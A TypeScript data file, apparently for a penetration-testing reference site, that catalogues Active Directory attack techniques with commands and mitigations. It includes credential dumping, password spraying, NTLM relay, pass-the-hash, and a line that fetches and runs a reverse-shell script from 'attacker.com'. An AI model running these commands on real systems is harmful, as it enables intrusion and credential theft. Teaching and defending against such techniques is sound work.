export interface AttackStep {
  title: string;
  description: string;
  code?: string;
}

export interface Tool {
  name: string;
  commands: string[];
}

export interface PentestTechnique {
  id: string;
  title: string;
  shortDescription: string;
  description: string;
  category: string;
  attackSteps: AttackStep[];
  mitigations: string[];
  methodology?: {
    steps?: string[];
    tools?: Tool[];
    commands?: string[];
  };
}

export const techniqueCategories: Record<string, string> = {
  "reconnaissance": "Reconnaissance",
  "credential-attacks": "Credential Attacks",
  "domain-attacks": "Domain Attacks",
  "lateral-movement": "Lateral Movement",
  "utilities": "Utilities"
};

export const techniques: PentestTechnique[] = [
  {
    id: "infrastructure-inventory",
    title: "Infrastructure Inventory",
    shortDescription: "Create a comprehensive inventory of the organization's infrastructure",
    category: "reconnaissance",
    description: `
      <p>The first step in any penetration test is to create a comprehensive inventory of the target organization's infrastructure. This includes identifying all systems, servers, networking devices, and categorizing them by IP addresses and device types.</p>
      <p>A thorough inventory helps establish the scope of testing and ensures no critical system is overlooked during the assessment process.</p>
    `,
    attackSteps: [
      {
        title: "Network Scanning",
        description: "Use network scanning tools to identify active hosts and open ports.",
        code: "nmap -sn 192.168.1.0/24 # Discover active hosts"
      },
      {
        title: "OS Detection",
        description: "Identify operating systems running on discovered hosts.",
        code: "nmap -O 192.168.1.0/24 # OS detection"
      },
      {
        title: "Service Identification",
        description: "Determine what services are running on each host and their versions.",
        code: "nmap -sV 192.168.1.0/24 # Service version detection"
      }
    ],
    mitigations: [
      "Maintain an up-to-date asset inventory",
      "Implement network segmentation to contain potential breaches",
      "Follow the principle of least privilege for all systems",
      "Disable unnecessary services and ports"
    ],
    methodology: {
      steps: [
        "Identify all systems, servers, and networking devices",
        "Separate and categorize IP addresses by device type",
        "Verify active IPs using PingInfo or AngryIPScanner"
      ]
    }
  },
  {
    id: "service-enumeration",
    title: "Service Enumeration",
    shortDescription: "Identifying and enumerating key services for authentication attacks",
    category: "reconnaissance",
    description: `
      <p>Service enumeration is the process of identifying and gathering information about network services running on target systems. This helps penetration testers understand potential attack vectors and vulnerabilities that can be exploited.</p>
      <p>By focusing on services commonly used for authentication, attackers can attempt to gain unauthorized access through brute force attacks, password spraying, or exploitation of service-specific vulnerabilities.</p>
    `,
    attackSteps: [
      {
        title: "Port Scanning",
        description: "Use Nmap to identify open ports and running services on target systems.",
        code: "nmap -sV -p- 192.168.1.0/24 # Full port scan with service version detection"
      },
      {
        title: "SMB Enumeration",
        description: "Enumerate SMB shares and permissions on Windows systems.",
        code: "enum4linux -a 192.168.1.100\nsmbclient -L //192.168.1.100/ -N"
      },
      {
        title: "LDAP Enumeration",
        description: "Query LDAP services to gather information about the directory structure.",
        code: "ldapsearch -x -h 192.168.1.100 -b \"dc=domain,dc=local\""
      },
      {
        title: "Database Service Enumeration",
        description: "Check for database services like MSSQL and MySQL and attempt to enumerate instances.",
        code: "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=sa -sV -p 1433 192.168.1.100"
      }
    ],
    mitigations: [
      "Implement network segmentation to restrict access to sensitive services",
      "Use strong authentication mechanisms for all services",
      "Disable unnecessary services and protocols",
      "Implement proper firewall rules to restrict access to services",
      "Regularly audit service configurations for security misconfigurations"
    ],
    methodology: {
      steps: [
        "FTP (21)",
        "SSH (22)",
        "Kerberos (88)",
        "SMB (139/445)",
        "LDAP (389)",
        "MSSQL (1433/1434)",
        "MYSQL (3306)",
        "RDP (3389)",
        "VNC (5900)"
      ],
      tools: [
        {
          name: "Metasploit (SMB Brute Force)",
          commands: [
            "msfconsole",
            "use auxiliary/scanner/smb/smb_login",
            "set PASS_FILE /root/Desktop/pass.txt",
            "set USER_FILE /root/Desktop/user.txt",
            "set RHOSTS file:/root/Desktop/host.txt",
            "set ABORT_ON_LOCKOUT true # If lockout policy is set",
            "set SMBDomain ADDomain # If AD is implemented",
            "run"
          ]
        },
        {
          name: "Metasploit (SMB Shares)",
          commands: [
            "use auxiliary/scanner/smb/smb_enumshares",
            "set rhosts 192.168.1.17",
            "set smbuser user",
            "set smbpass pass",
            "exploit"
          ]
        },
        {
          name: "Metasploit (PSExec)",
          commands: [
            "use exploit/windows/smb/psexec",
            "setg rhost 10.10.110.200",
            "setg SMBDomain mgmotor.ad.com",
            "setg smbpass Pass@1234",
            "setg smbuser 9000",
            "run"
          ]
        }
      ]
    }
  },
  {
    id: "enumerate-username",
    title: "Username Enumeration",
    shortDescription: "Discovering valid usernames in various systems and services.",
    category: "reconnaissance",
    description: `
      <p>Username enumeration is the process of discovering valid user accounts in a system or environment. This can be done through various techniques across different protocols and services.</p>
      <p>Once valid usernames are identified, they can be used in further attacks like password spraying, brute forcing, or targeted social engineering.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Username Enumeration",
        description: "Enumerate users from Active Directory services using tools like CrackMapExec.",
        code: "crackmapexec smb 192.168.1.100 --users\nldapsearch -x -h 192.168.1.100 -b \"dc=corp,dc=local\" \"(objectClass=user)\""
      },
      {
        title: "SMB Username Enumeration",
        description: "Use tools like Enum4Linux to extract user lists from SMB services, including non-AD environments.",
        code: "enum4linux -U 192.168.1.100\n# Or with Metasploit\nuse auxiliary/scanner/smb/smb_enumusers"
      },
      {
        title: "Web Application Username Enumeration",
        description: "Identify valid users through different responses in login forms or password reset functionality.",
        code: "# Using Hydra for WordPress username enumeration\nhydra -L users.txt -p Password123! http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username\""
      },
      {
        title: "Email & OSINT Enumeration",
        description: "Use open-source intelligence and email harvesting to discover organizational usernames.",
        code: "theHarvester -d example.com -b google,linkedin"
      }
    ],
    mitigations: [
      "Configure services to provide generic error messages that don't reveal if a username exists",
      "Implement rate limiting on authentication endpoints to prevent automated enumeration",
      "Disable SMB NULL sessions with <code>RestrictAnonymous=2</code> in the registry",
      "Use strong LDAP authentication controls to prevent anonymous queries",
      "Monitor for multiple failed login attempts from the same source IP address"
    ]
  },
  {
    id: "guest-user-identify",
    title: "Guest User Identification",
    shortDescription: "Techniques to identify guest user accounts on networks.",
    category: "reconnaissance",
    description: `
      <p>Guest users and accounts are often overlooked in security assessments but can provide significant attack vectors. Identifying these accounts is a crucial step in understanding the security posture of a network.</p>
      <p>Guest accounts may have unexpected privileges, outdated passwords, or might be using default credentials. They're often created for temporary access and then forgotten about, leaving them vulnerable.</p>
    `,
    attackSteps: [
      {
        title: "Active Directory Enumeration",
        description: "Check for users in the built-in Guests group or accounts with guest-like properties.",
        code: "Get-ADUser -Filter 'memberOf -RecursiveMatch \"CN=Guests,CN=Builtin,DC=domain,DC=local\"'"
      },
      {
        title: "Network Traffic Analysis",
        description: "Monitor DHCP requests to find devices with generic hostnames that may indicate guest systems.",
        code: "dhcp.option.hostname contains \"Guest\""
      },
      {
        title: "Checking Shared Folder Access",
        description: "Examine SMB sessions to identify unauthorized or guest access to shared resources.",
        code: "Get-SmbSession | Select-Object ClientComputerName, Username"
      },
      {
        title: "Using Nmap for Guest Device Discovery",
        description: "Scan the network to detect unknown or guest devices based on MAC addresses or open ports.",
        code: "nmap -sn 192.168.1.0/24 --open"
      }
    ],
    mitigations: [
      "Disable default guest accounts: <code>Net user Guest /active:no</code>",
      "Implement Network Access Control (NAC) to restrict unauthorized devices",
      "Use 802.1X authentication for network access",
      "Monitor DHCP logs for unexpected or unknown devices",
      "Enforce strong security policies for temporary accounts including automatic expiration"
    ]
  },
  {
    id: "llmnr-poisoning",
    title: "LLMNR & NBT-NS Poisoning",
    shortDescription: "Exploiting name resolution protocols to capture NetNTLM hashes.",
    category: "credential-attacks",
    description: `
      <p>LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are protocols used for name resolution when DNS fails. They're enabled by default in Windows environments and can be exploited to capture NetNTLM hashes.</p>
      <p>When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting LLMNR and NBT-NS queries on the local network. An attacker can listen for these broadcasts and respond to them, forcing the victim to send their NetNTLM hash.</p>
    `,
    attackSteps: [
      {
        title: "Setting up Responder",
        description: "Responder by Laurent Gaffié is the most popular tool for LLMNR/NBT-NS poisoning. It listens for name resolution requests and responds to them, forcing authentication.",
        code: "sudo responder -I eth0 -rv"
      },
      {
        title: "Forcing a name resolution request",
        description: "On a victim machine, attempt to connect to a non-existent share to trigger name resolution.",
        code: "net use \\\\fakehost\\share"
      },
      {
        title: "Capturing and cracking hashes",
        description: "Responder will capture NetNTLM hashes which can be cracked with tools like Hashcat.",
        code: "hashcat -m 5600 captured_hash.txt rockyou.txt --force"
      },
      {
        title: "Alternative: Using Inveigh on Windows",
        description: "For Windows environments, Inveigh provides similar functionality to Responder.",
        code: "Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -NBNS Y -LLMNR Y -HTTP N"
      }
    ],
    mitigations: [
      "Disable LLMNR via Group Policy: <code>Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled</code>",
      "Disable NBT-NS: <code>Network Adapter Properties → IPv4 Properties → Advanced → WINS tab → Disable NetBIOS over TCP/IP</code>",
      "Enable SMB Signing to prevent relay attacks: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true</code>",
      "Implement strong password policies to make hash cracking more difficult."
    ],
    methodology: {
      tools: [
        {
          name: "Responder",
          commands: [
            "responder -I ens33 -wdrf",
            "responder -I ens33 -wd",
            "responder -I ens33 -A",
            "responder -I ens33 -wdF -b",
            "responder -I ens33 -wdF --lm --disable-ess",
            "responder -I ens33 -e 192.168.1.2"
          ]
        },
        {
          name: "Hash Cracking",
          commands: [
            "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
            "john SMB-NTLMv2-SSP-192.168.100.101.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "hashcat -m 5600 HTTP-NTLMv2-fe80::ddc5:3b8f:e421:a88a.txt /usr/share/wordlists/rockyou.txt",
            "# Online resources:",
            "# https://crackstation.net/",
            "# https://hashes.com/en/decrypt/hash"
          ]
        }
      ]
    }
  },
  {
    id: "hash-capture",
    title: "Hash Capture & Cracking",
    shortDescription: "Techniques for capturing and cracking authentication hashes",
    category: "credential-attacks",
    description: `
      <p>Hash capture involves intercepting authentication hashes from network traffic or extracting them from compromised systems. Once captured, these hashes can be cracked offline to recover plaintext passwords.</p>
      <p>Common techniques include LLMNR/NBT-NS poisoning, SMB relay attacks, and extracting hashes directly from memory or storage on compromised systems.</p>
    `,
    attackSteps: [
      {
        title: "Responder Setup",
        description: "Use Responder to capture NetNTLM hashes via LLMNR/NBT-NS poisoning.",
        code: "sudo responder -I eth0 -rdwv"
      },
      {
        title: "Hash Extraction",
        description: "Extract hashes from a compromised Windows system using Mimikatz.",
        code: "privilege::debug\nsekurlsa::logonpasswords\nlsadump::sam"
      },
      {
        title: "Offline Hash Cracking",
        description: "Use Hashcat or John the Ripper to crack the captured hashes.",
        code: "hashcat -m 1000 ntlm_hashes.txt wordlist.txt\njohn --format=netntlmv2 hashes.txt --wordlist=wordlist.txt"
      },
      {
        title: "Online Hash Lookups",
        description: "Check if the hash exists in online rainbow tables or breach databases.",
        code: "# Visit services like:\n# https://crackstation.net/\n# https://hashes.com/en/decrypt/hash"
      }
    ],
    mitigations: [
      "Disable LLMNR and NBT-NS to prevent poisoning attacks",
      "Implement network segmentation to limit the impact of hash capture",
      "Use strong password policies to make hash cracking more difficult",
      "Enable MFA wherever possible to mitigate the impact of compromised credentials",
      "Monitor for signs of hash capture attempts in network traffic"
    ],
    methodology: {
      tools: [
        {
          name: "Responder (LLMNR/NBT-NS Poisoning)",
          commands: [
            "responder -I eth0 -rv # Basic usage",
            "responder -I ens33 -wdrf",
            "responder -I ens33 -wd",
            "responder -I ens33 -wdF -b",
            "responder -I ens33 -wdF --lm --disable-ess"
          ]
        },
        {
          name: "Hash Cracking",
          commands: [
            "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
            "john SMB-NTLMv2-SSP-192.168.100.101.txt --wordlist=/usr/share/wordlists/rockyou.txt",
            "# Online resources:",
            "# https://crackstation.net/",
            "# https://hashes.com/en/decrypt/hash"
          ]
        },
        {
          name: "Leak Data Checking",
          commands: [
            "# Online resources:",
            "# https://leakcheck.io/",
            "# https://breachdirectory.org/",
            "# https://www.dehashed.com/"
          ]
        }
      ]
    }
  },
  {
    id: "ntlm-relay",
    title: "NetNTLM Relay Over SMB",
    shortDescription: "Intercepting and relaying NTLM authentication to gain unauthorized access.",
    category: "credential-attacks",
    description: `
      <p>NetNTLM relay attacks exploit Windows authentication by intercepting NTLM challenge-response authentication attempts and forwarding them to another system. This allows an attacker to authenticate to servers as the victim without knowing their password.</p>
      <p>SMB (Server Message Block) is one of the most common protocols targeted in NTLM relay attacks, especially in environments where SMB signing is not enforced.</p>
    `,
    attackSteps: [
      {
        title: "Identify Targets Without SMB Signing",
        description: "Use Nmap to scan for systems that have SMB signing disabled, making them vulnerable to relay attacks.",
        code: "nmap -p 445 --script smb2-security-mode 192.168.1.0/24"
      },
      {
        title: "Configure Responder for Relay",
        description: "Modify Responder configuration to prevent hash capture and allow relay attacks.",
        code: "# Edit /etc/responder/Responder.conf\n# Set SMB = Off\n# Set HTTP = Off\npython3 Responder.py -I eth0 -rv"
      },
      {
        title: "Set up NTLM Relay",
        description: "Use ntlmrelayx.py to relay captured NTLM authentication to target systems.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support"
      },
      {
        title: "Execute Commands via Relayed Authentication",
        description: "If successful, execute commands on the target system using the relayed credentials.",
        code: "python3 ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://attacker.com/rev.ps1\\')\"'"
      }
    ],
    mitigations: [
      "Enable SMB Signing on all Windows systems: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code>",
      "Use LDAP signing and channel binding to prevent LDAP relay attacks",
      "Disable LLMNR and NetBIOS Name Service to prevent capturing authentication attempts",
      "Implement network segmentation to limit the impact of relay attacks",
      "Monitor for unexpected authentication attempts and SMB sessions"
    ]
  },
  {
    id: "password-attacks",
    title: "Brute Force & Password Spray",
    shortDescription: "Techniques to discover weak credentials in multiple services.",
    category: "credential-attacks",
    description: `
      <p>Password attacks attempt to discover valid credentials by either trying many passwords against a single account (brute force) or trying a few common passwords against many accounts (password spraying).</p>
      <p>Password spraying is often more effective and less likely to trigger account lockouts, as it tries a small number of common passwords across many accounts.</p>
    `,
    attackSteps: [
      {
        title: "SMB Password Spraying with Metasploit",
        description: "Use Metasploit's smb_login module to attempt common passwords against multiple SMB users.",
        code: "use auxiliary/scanner/smb/smb_login\nset RHOSTS 192.168.1.10\nset USER_FILE users.txt\nset PASSWORD Spring2024!\nset THREADS 10\nrun"
      },
      {
        title: "Password Spraying with CrackMapExec",
        description: "CrackMapExec allows for efficient password spraying across multiple protocols including SMB, WinRM, and MSSQL.",
        code: "crackmapexec smb 192.168.1.0/24 -u users.txt -p \"Welcome123!\""
      },
      {
        title: "Targeted Brute Force with Hydra",
        description: "For specific targets, Hydra can attempt multiple passwords against services like SSH, FTP, or web applications.",
        code: "hydra -L users.txt -P passwords.txt smb://192.168.1.10"
      },
      {
        title: "Avoiding Account Lockouts",
        description: "Implement delays between attempts and monitor for account lockout policies to avoid triggering security alerts.",
        code: "# Using CrackMapExec with a delay\ncrackmapexec smb 192.168.1.0/24 -u users.txt -p common-passwords.txt --delay 5"
      }
    ],
    mitigations: [
      "Implement account lockout policies after a reasonable number of failed attempts",
      "Use multi-factor authentication (MFA) to prevent password-only attacks",
      "Enforce strong password policies with minimum complexity requirements",
      "Monitor for multiple failed login attempts from the same source",
      "Use adaptive authentication that considers login behavior and risk factors"
    ]
  },
  {
    id: "ad-enumeration",
    title: "Active Directory Enumeration",
    shortDescription: "Gathering information about Active Directory domain structure.",
    category: "domain-attacks",
    description: `
      <p>Domain enumeration is the process of gathering information about the structure, users, groups, and policies of an Active Directory domain. This is typically one of the first steps in an Active Directory penetration test.</p>
      <p>Effective domain enumeration can reveal security misconfigurations, overly permissive access controls, and potential attack vectors within the domain infrastructure.</p>
    `,
    attackSteps: [
      {
        title: "Initial Domain Discovery",
        description: "Determine the domain name and identify domain controllers.",
        code: "nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local"
      },
      {
        title: "Enumerate Domain Trusts",
        description: "Identify trust relationships between domains that could be leveraged for lateral movement.",
        code: "Get-DomainTrust\n# Or using PowerView\nGet-NetDomainTrust"
      },
      {
        title: "Identify Domain Policies",
        description: "Gather information about domain password policies and security settings.",
        code: "Get-DomainPolicy\n# Or using native commands\nnet accounts"
      },
      {
        title: "Map Domain Structure",
        description: "Use tools like BloodHound to visualize the domain structure and identify attack paths.",
        code: "# Using SharpHound\nInvoke-BloodHound -CollectionMethod All -Verbose"
      }
    ],
    mitigations: [
      "Implement least privilege access controls across the domain",
      "Regularly audit domain trusts and remove unnecessary relationships",
      "Use strong password policies and enable MFA where possible",
      "Monitor for unusual domain enumeration activities using event logs (Event IDs 4624, 4625, 4768, 4769)",
      "Segment the network to limit the scope of domain enumeration attempts"
    ],
    methodology: {
      steps: [
        "1. Getting IP",
        "2. Getting Local USER",
        "3. Getting Local USER PASSWORD",
        "4. Dump All Hashes",
        "5. Enumerate for AD User",
        "6. Enumerate for AD User Password",
        "7. Enumerate for AD Domain",
        "8. Enumerate for AD Domain Password",
        "9. Login"
      ],
      tools: [
        {
          name: "Bloodhound",
          commands: [
            "neo4j console # First start the Neo4j service",
            "bloodhound # Then open Bloodhound",
            "# On target Windows system:",
            "powershell -ep bypass",
            ".\\SharpHound.ps1",
            "Invoke-BloodHound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip"
          ]
        },
        {
          name: "Impacket",
          commands: [
            "impacket-psexec ad.domain/user:pass@IP",
            "impacket-wmiexec ad.domain/user:pass@IP",
            "impacket-secretsdump ad.domain/user:pass@IP",
            "impacket-GetADUsers ad.domain/user:pass@IP",
            "impacket-mimikatz ad.domain/user:pass@IP",
            "impacket-smbpasswd ad.domain/user:pass@IP"
          ]
        },
        {
          name: "RPCClient",
          commands: [
            "rpcclient -U ad.domain%user:pass IP",
            "querydominfo # Domain Information Query",
            "enumdomusers # Enumerating Domain Users",
            "enumdomgroups # Enumerating Domain Groups",
            "querygroup 0x200 # Group Queries",
            "queryuser User # User Queries",
            "enumprivs # Enumerating Privileges",
            "getdompwinfo # Get Domain Password Information",
            "createdomuser hacker # Creating Domain User",
            "setuserinfo2 hacker 24 Password@1 # Set user password",
            "deletedomuser hacker # Delete Domain User",
            "netshareenumall/netshareenum # Net Share Enumeration"
          ]
        }
      ]
    }
  },
  {
    id: "smb-enumeration",
    title: "SMB Enumeration",
    shortDescription: "Techniques for enumerating SMB shares and resources",
    category: "domain-attacks",
    description: `
      <p>SMB (Server Message Block) enumeration involves gathering information about file shares, permissions, users, and other resources available via the SMB protocol on Windows systems.</p>
      <p>This information can be leveraged to identify potential attack vectors such as misconfigured shares, weak permissions, or opportunities for lateral movement within a network.</p>
    `,
    attackSteps: [
      {
        title: "Basic SMB Enumeration",
        description: "Use built-in tools to enumerate SMB shares on a target system.",
        code: "net view \\\\192.168.1.100\nnbtstat -A 192.168.1.100"
      },
      {
        title: "SMB Share Access Testing",
        description: "Test access to SMB shares to identify accessible resources.",
        code: "smbclient -L //192.168.1.100/ -N\nsmbclient //192.168.1.100/share -N"
      },
      {
        title: "User and Group Enumeration",
        description: "Enumerate users and groups via SMB to identify potential targets.",
        code: "enum4linux -U -G 192.168.1.100"
      },
      {
        title: "SMB Version Detection",
        description: "Identify the SMB version to determine potential vulnerabilities.",
        code: "nmap --script smb-protocols -p 445 192.168.1.100"
      }
    ],
    mitigations: [
      "Implement proper access controls on SMB shares",
      "Disable SMB1 and use only secure versions of the protocol",
      "Enable SMB signing to prevent relay attacks",
      "Regularly audit share permissions and access",
      "Monitor for suspicious SMB activity and authentication attempts"
    ],
    methodology: {
      tools: [
        {
          name: "enum4linux",
          commands: [
            "enum4linux -U 10.10.0.50 # Enumerate users",
            "enum4linux -S 10.10.0.50 # Enumerate shares",
            "enum4linux -P 10.10.0.50 # Get password policy",
            "enum4linux -a 10.10.0.50 # All enumeration"
          ]
        },
        {
          name: "smbmap",
          commands: [
            "smbmap -H 192.168.1.40",
            "smbmap -H 192.168.1.17 -u user -p pass"
          ]
        },
        {
          name: "smbclient",
          commands: [
            "smbclient -L //10.10.0.50/",
            "smbclient -L //10.10.0.50/ -U '' -N",
            "smbclient //10.10.0.50/tmp"
          ]
        }
      ]
    }
  },
  {
    id: "kerbrute",
    title: "Kerberos Enumeration",
    shortDescription: "Techniques for enumerating users and services via Kerberos",
    category: "domain-attacks",
    description: `
      <p>Kerberos enumeration involves identifying valid domain users, services, and potential misconfigurations in Kerberos implementations within Active Directory environments.</p>
      <p>By leveraging the Kerberos authentication protocol, attackers can enumerate valid usernames, identify service accounts, and potentially exploit weaknesses like Kerberoasting or AS-REP Roasting.</p>
    `,
    attackSteps: [
      {
        title: "User Enumeration via Kerberos",
        description: "Use Kerbrute to enumerate valid domain users.",
        code: "kerbrute userenum -d domain.local --dc dc.domain.local userlist.txt"
      },
      {
        title: "Service Principal Name (SPN) Scanning",
        description: "Identify service accounts by enumerating SPNs.",
        code: "GetUserSPNs.py domain.local/user:password -outputfile spns.txt"
      },
      {
        title: "AS-REP Roasting",
        description: "Find users with Kerberos pre-authentication disabled.",
        code: "GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt"
      },
      {
        title: "Kerberoasting",
        description: "Request service tickets for accounts with SPNs and extract their hashes.",
        code: "GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.txt"
      }
    ],
    mitigations: [
      "Enable Kerberos pre-authentication for all accounts",
      "Use strong passwords for service accounts",
      "Regularly rotate service account passwords",
      "Monitor for suspicious Kerberos authentication attempts",
      "Implement the Protected Users group for sensitive accounts"
    ],
    methodology: {
      commands: [
        "gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt",
        "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='DOMAIN'\" <IP>",
        "./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt",
        "GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username"
      ],
      tools: [
        {
          name: "Metasploit Kerberos",
          commands: [
            "use auxiliary/gather/kerberos_enumusers"
          ]
        }
      ]
    }
  },
  {
    id: "adcs-attack",
    title: "ADCS NTLM Relay Attack",
    shortDescription: "Exploiting Active Directory Certificate Services for privilege escalation.",
    category: "domain-attacks",
    description: `
      <p>Active Directory Certificate Services (ADCS) NTLM relay attacks exploit misconfigured certificate enrollment services to gain unauthorized access and elevate privileges within a domain.</p>
      <p>By relaying captured NTLM authentication to an ADCS web enrollment endpoint, an attacker can request certificates that enable Kerberos authentication as any user, including domain administrators.</p>
    `,
    attackSteps: [
      {
        title: "Identify ADCS Web Enrollment",
        description: "First, check if ADCS web enrollment services are available in the target domain.",
        code: "certipy find -u 'DOMAIN\\user:password' -dc-ip 192.168.1.100\n# Or\ncertutil -config - -ping"
      },
      {
        title: "Set up NTLM Relay Targeting ADCS",
        description: "Configure ntlmrelayx.py to relay NTLM authentication to the ADCS web enrollment endpoint.",
        code: "python3 ntlmrelayx.py -t http://adcs-server/certsrv/ --adcs"
      },
      {
        title: "Force Authentication using PetitPotam",
        description: "Use PetitPotam or other coercion techniques to force a domain controller to authenticate to the attacker.",
        code: "python3 PetitPotam.py -d domain.local -u user -p pass attacker-ip dc-ip"
      },
      {
        title: "Use the Certificate for Domain Admin Access",
        description: "Once a certificate is obtained, use it to request a Kerberos ticket for domain admin access.",
        code: "Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /domain:domain.local /ptt"
      }
    ],
    mitigations: [
      "Disable NTLM authentication on ADCS web enrollment: <code>Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/Default Web Site/CertSrv' -filter \"system.webServer/security/authentication/windowsAuthentication\" -name \"enabled\" -value False</code>",
      "Enforce HTTPS for all ADCS web enrollment services",
      "Implement Extended Protection for Authentication (EPA) on ADCS servers",
      "Patch systems against PetitPotam and other authentication coercion techniques",
      "Monitor for unexpected certificate requests and authentications"
    ]
  },
  {
    id: "pass-the-hash",
    title: "Pass-the-Hash Attack",
    shortDescription: "Using captured NTLM hashes to authenticate without knowing the password.",
    category: "lateral-movement",
    description: `
      <p>Pass-the-Hash (PtH) is a technique where attackers use captured NTLM password hashes to authenticate to systems without knowing the actual plaintext password.</p>
      <p>This attack works because Windows authentication protocols like NTLM don't require the actual password for authentication, just a valid hash, making it a powerful technique for lateral movement after initial compromise.</p>
    `,
    attackSteps: [
      {
        title: "Extract NTLM Hashes using Mimikatz",
        description: "On a compromised system, use Mimikatz to extract NTLM hashes from memory or the SAM database.",
        code: "privilege::debug\nsekurlsa::logonpasswords\n# Or for SAM database\nlsadump::sam"
      },
      {
        title: "Pass-the-Hash with Mimikatz",
        description: "Use Mimikatz to create a new session with the captured NTLM hash.",
        code: "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:powershell.exe"
      },
      {
        title: "Pass-the-Hash with CrackMapExec",
        description: "Use CrackMapExec to authenticate to remote systems using the NTLM hash.",
        code: "crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee"
      },
      {
        title: "Execute Commands using PtH",
        description: "Once authenticated with the hash, execute commands on the remote system.",
        code: "crackmapexec winrm 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee -x \"whoami /all\""
      }
    ],
    mitigations: [
      "Implement the Local Administrator Password Solution (LAPS) to prevent password reuse across systems",
      "Enforce SMB signing to prevent NTLM relay attacks: <code>Set-SmbServerConfiguration -RequireSecuritySignature $true</code>",
      "Use Credential Guard to protect credential hashes in memory",
      "Implement Just-In-Time administration and Privileged Access Management",
      "Monitor for unexpected authentication events, especially from unexpected source systems"
    ]
  },
  {
    id: "ipv6-attack",
    title: "IPv6-Based Attacks (mitm6)",
    shortDescription: "Exploiting default IPv6 behavior to perform MitM attacks.",
    category: "lateral-movement",
    description: `
      <p>IPv6-based attacks using mitm6 exploit the default IPv6 configuration in Windows environments. The tool abuses the fact that Windows prioritizes IPv6 over IPv4 even when no IPv6 infrastructure exists.</p>
      <p>By spoofing IPv6 router advertisements and DNS responses, an attacker can force clients to use a malicious DNS server, enabling man-in-the-middle attacks and NetNTLM hash capturing.</p>
    `,
    attackSteps: [
      {
        title: "Start the mitm6 Attack",
        description: "Launch mitm6 to begin spoofing IPv6 router advertisements and DNS responses.",
        code: "python3 mitm6.py -d domain.local"
      },
      {
        title: "Set up NTLM Relay with LDAP Target",
        description: "Configure ntlmrelayx.py to relay captured NTLM authentication to LDAP services.",
        code: "python3 ntlmrelayx.py -6 -t ldap://192.168.1.10 -wh fakewpad --delegate-access"
      },
      {
        title: "Creating a New Computer Account",
        description: "If successful, the attack will create a new computer account with delegation rights.",
        code: "# This happens automatically if --delegate-access is specified\n# Look for 'Delegation rights added' in the output"
      },
      {
        title: "Exploit Resource-Based Constrained Delegation",
        description: "Use the created computer account to perform further attacks like Resource-Based Constrained Delegation.",
        code: "python3 getST.py -spn cifs/target-dc domain.local/computer-account -impersonate administrator"
      }
    ],
    mitigations: [
      "Disable IPv6 if not in use: <code>Set-NetAdapterBinding -Name 'Ethernet' -ComponentID ms_tcpip6 -Enabled $false</code>",
      "Block DHCPv6 traffic and router advertisements via Windows Firewall",
      "Implement LDAP signing and channel binding to prevent LDAP relay attacks",
      "Use Protected Users group for sensitive accounts to prevent delegation attacks",
      "Monitor for unexpected IPv6 traffic in predominantly IPv4 networks"
    ]
  },
  {
    id: "file-transfer",
    title: "File Transfer Techniques",
    shortDescription: "Methods to transfer data between systems during testing",
    category: "utilities",
    description: `
      <p>Effective file transfer techniques are essential during penetration testing for moving tools, exploits, and data between systems. Various methods exist depending on the available services and security controls.</p>
      <p>Being able to reliably transfer files to and from target systems enables penetration testers to escalate privileges, exfiltrate data, or deploy additional tools during post-exploitation phases.</p>
    `,
    attackSteps: [
      {
        title: "HTTP File Transfer",
        description: "Use Python's built-in HTTP server to host and transfer files.",
        code: "# On attacker machine\npython3 -m http.server 8000\n\n# On target machine\nwget http://attacker-ip:8000/file.txt\n# or\ncurl http://attacker-ip:8000/file.txt -o file.txt"
      },
      {
        title: "SMB File Transfer",
        description: "Use SMB shares to transfer files in Windows environments.",
        code: "# On attacker machine\nimpacket-smbserver share /path/to/share\n\n# On target Windows machine\ncopy \\\\attacker-ip\\share\\file.exe C:\\Windows\\Temp\\"
      },
      {
        title: "Base64 Transfer",
        description: "Encode files as Base64 for transfer through limited channels.",
        code: "# On source machine (Linux)\ncat file.txt | base64\n\n# Copy the output, then on destination\necho \"base64_string\" | base64 -d > file.txt\n\n# On source machine (Windows)\ncertutil -encode file.txt tmp.b64 && type tmp.b64\n\n# On destination (Windows)\ncertutil -decode tmp.b64 file.txt"
      },
      {
        title: "Secure Copy (SCP)",
        description: "Use SCP for secure file transfers when SSH access is available.",
        code: "# Upload from local to remote\nscp /path/to/local/file user@remote:/path/to/remote/file\n\n# Download from remote to local\nscp user@remote:/path/to/remote/file /path/to/local/file"
      }
    ],
    mitigations: [
      "Implement application whitelisting to prevent execution of unauthorized tools",
      "Monitor for unusual network traffic patterns that may indicate file transfers",
      "Use data loss prevention (DLP) solutions to detect sensitive data exfiltration",
